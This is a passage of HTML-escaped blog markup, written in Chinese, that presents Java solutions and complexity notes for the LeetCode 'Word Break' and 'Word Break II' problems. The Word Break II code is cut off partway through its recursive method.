&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;containsKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;时间复杂度：O(n^2*m) 其中n是字符串s的长度，m是字典中最长单词的长度&lt;/p&gt;
&lt;p&gt;空间复杂度：O(n)&lt;/p&gt;
&lt;h3 id=&#34;单词拆分ii&#34;&gt;单词拆分II&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://leetcode.cn/problems/word-break-ii/description/&#34;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wordbreak2.png&#34; alt=&#34;wordbreak1.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;dfs回溯&#34;&gt;DFS+回溯&lt;/h4&gt;
&lt;p&gt;II相比于I，不仅要判断解是否存在，还要列出所有可能的解&lt;/p&gt;
&lt;h5 id=&#34;分析&#34;&gt;分析&lt;/h5&gt;
&lt;p&gt;递归的基条件是检查起始位置start是否已经到达字符串s的末尾。如果是，就将当前路径添加到结果列表中。在每次递归中，遍历单词字典，尝试将每个单词作为当前位置的前缀。如果成功，将该单词添加到当前路径中，并递归地调用dfs处理剩下的字符串。在每次递归调用dfs后，需要从当前路径中移除最后添加的单词，这确保了当前路径始终反映了到当前递归深度为止的所有有效选择，每当找到一个有效的单词组合时，就将其以字符串形式添加到结果列表中。&lt;/p&gt;
&lt;h5 id=&#34;代码-2&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
